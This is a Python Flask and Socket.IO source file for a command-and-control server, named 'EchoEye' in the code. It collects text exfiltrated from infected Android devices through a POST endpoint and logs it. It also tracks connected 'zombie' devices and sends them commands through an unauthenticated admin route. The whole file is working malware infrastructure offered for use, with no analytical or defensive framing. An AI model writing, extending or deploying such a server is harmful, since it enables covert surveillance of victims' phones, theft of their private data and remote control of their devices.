from flask import Flask, request, render_template
from flask_socketio import SocketIO, emit, join_room
import logging

# --- C2 Server Configuration ---
app = Flask(__name__)
app.config['SECRET_KEY'] = 'echoeye-secret-key'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Suppress extensive logging for cleaner output
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route("/")
def index():
    """Root endpoint to verify server status."""
    return "EchoEye C2 Server is Active."

@app.route("/api/events", methods=["POST"])
def api_events():
    """
    REST Endpoint for Data Exfiltration.
    Receives captured text/events from the Android Implant via HTTP POST.
    """
    try:
        body = request.get_data(as_text=True)
        src = request.headers.get("X-App", "Unknown-App")
        
        # Log the stolen data to STDOUT (Server Logs)
        print(f"[+] Received Exfiltrated Data:")
        print(f"    Source: {src}")
        print(f"    Payload: {body}")
        print("-" * 30)
        
        return "OK", 200
    except Exception as e:
        return f"Error: {str(e)}", 500

# --- Real-time Command & Control (Socket.IO) ---

@socketio.on("connect", namespace="/device")
def on_connect():
    """Handle new infected device connection."""
    device_id = request.args.get("deviceId", "unknown_device")
    join_room(device_id)
    print(f"[*] New Zombie Connected: {device_id}")
    emit("server_response", {"msg": f"Handshake successful with {device_id}"})

@socketio.on("client_event", namespace="/device")
def on_client_event(payload):
    """Handle real-time events from device."""
    print(f"[*] Real-time Event: {payload}")

@app.route("/admin/send/<device_id>/<cmd>")
def send_cmd(device_id, cmd):
    """
    Admin C2 Interface.
    Allows the attacker to send commands to a specific infected device.
    Usage: /admin/send/device_id/command?text=optional_text
    """
    text = request.args.get("text", "")
    payload = {"command": cmd}
    if text:
        payload["text"] = text
    
    print(f"[>] Sending Command '{cmd}' to Target '{device_id}'...")
    socketio.emit("server_command", payload, room=device_id, namespace="/device")
    return f"Command '{cmd}' sent to {device_id}", 200

if __name__ == "__main__":
    print("[*] Starting C2 Server on port 8080...")
    socketio.run(app, host="0.0.0.0", port=8080)